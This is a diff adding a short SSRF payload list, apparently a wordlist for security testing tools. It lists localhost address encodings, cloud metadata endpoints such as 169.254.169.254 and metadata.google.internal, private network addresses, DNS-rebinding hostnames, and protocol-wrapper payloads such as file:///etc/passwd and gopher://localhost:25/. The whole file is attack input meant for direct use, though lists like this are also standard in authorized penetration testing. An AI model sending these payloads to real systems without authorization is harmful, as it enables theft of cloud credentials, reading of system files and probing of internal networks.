@@ -1,0 +1,31 @@
+# SSRF Payloads
+# Server-Side Request Forgery attack vectors
+
+# Localhost variations
+http://localhost
+http://127.0.0.1
+http://0.0.0.0
+http://[::1]
+http://127.1
+http://2130706433
+
+# Cloud metadata endpoints
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/v1/
+
+# Internal network ranges
+http://192.168.0.1
+http://192.168.1.1
+http://10.0.0.1
+http://172.16.0.1
+
+# DNS rebinding
+http://localtest.me
+http://customer1.app.localhost.my.company.127.0.0.1.nip.io
+
+# Protocol wrappers
+file:///etc/passwd
+file:///c:/windows/win.ini
+dict://localhost:11211/
+gopher://localhost:25/
